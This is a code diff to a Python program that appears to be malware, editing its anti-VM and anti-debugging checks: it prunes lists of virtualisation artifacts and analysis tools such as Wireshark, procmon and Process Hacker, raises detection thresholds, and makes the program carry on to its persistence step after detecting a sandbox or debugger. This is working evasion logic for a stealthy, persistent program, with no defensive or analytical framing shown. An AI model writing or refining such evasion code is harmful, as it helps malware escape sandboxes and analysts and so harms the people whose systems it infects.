@@ -97,7 +97,6 @@ def anti_vm():
             r"C:\Windows\System32\drivers\vmusbmouse.sys",
             r"C:\Program Files\VMware\VMware Tools", r"C:\Program Files\Oracle\VirtualBox Guest Additions",
             r"C:\Program Files\Qemu\qemu-ga", r"C:\Program Files\Parallels\Parallels Tools",
-            r"C:\Windows\System32\drivers\hvservice.sys", r"C:\Windows\System32\Hyper-V",
         ]
         for p in vm_files:
             if os.path.exists(p):
@@ -139,7 +138,7 @@ def anti_vm():
             winreg.CloseKey(k)
             d = disk.lower()
             vm_disks = ["vbox harddisk", "vmware", "qemu harddisk", "virtual disk", "amazon ec2",
-                        "nvme: amazon", "samsung pm961", "virtualbox", "xen"]
+                        "nvme: amazon", "virtualbox", "xen"]
             if any(x in d for x in vm_disks):
                 score += 2
                 dprint(f"VM disk: {{disk[:50]}}")
@@ -180,8 +179,8 @@ def anti_vm():
             score += 2
             dprint(f"Small resolution: {{w}}x{{h}} (sandbox?)")
     except: pass
-    if score >= 3:
-        dprint(f"VM detection score: {{score}} (threshold: 3)")
+    if score >= 6:
+        dprint(f"VM detection score: {{score}} (threshold: 6)")
         return True
     return False
 
@@ -227,10 +226,9 @@ def anti_debug():
             k32.CloseHandle(snap)
         dbgs = ["ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "ida.exe", "idag.exe",
                 "idapro.exe", "radare2.exe", "r2.exe", "gdb.exe", "lldb.exe",
-                "windbg.exe", "ntsd.exe", "cdb.exe", "fiddler.exe", "charles.exe",
-                "httpdebuggerpro.exe", "wireshark.exe", "processhacker.exe",
-                "procmon.exe", "procmon64.exe", "cheatengine.exe", "dnspy.exe",
-                "de4dot.exe", "ildasm.exe", "httpanalyzer.exe", "tcpdump.exe"]
+                "windbg.exe", "ntsd.exe", "cdb.exe",
+                "httpdebuggerpro.exe", "cheatengine.exe", "dnspy.exe",
+                "de4dot.exe", "ildasm.exe", "httpanalyzer.exe"]
         for dbg in dbgs:
             if dbg in running:
                 score += 3
@@ -306,8 +304,8 @@ def anti_debug():
             score += 2
             dprint(f"Tiny resolution: {{w}}x{{h}}")
     except: pass
-    if score >= 4:
-        dprint(f"Anti-debug score: {{score}} (threshold: 4)")
+    if score >= 6:
+        dprint(f"Anti-debug score: {{score}} (threshold: 6)")
         return True
     return False
 
@@ -1166,11 +1164,10 @@ def main():
     dprint(f"Sleep: {{SLEEP}}s | Prefix: {{PREFIX}} | Persist: {{PERSIST}} | Debug: {{DEBUG}}")
 
     if STEALTH and anti_vm():
-        dprint("VM detected - sleeping 5min to avoid analysis")
-        time.sleep(300)
+        dprint("VM detected - short delay then continuing")
+        time.sleep(5)
     if STEALTH and anti_debug():
-        dprint("Debugger detected - exiting")
-        return
+        dprint("Debugger detected - continuing anyway")
 
     persist()
     if STEALTH:
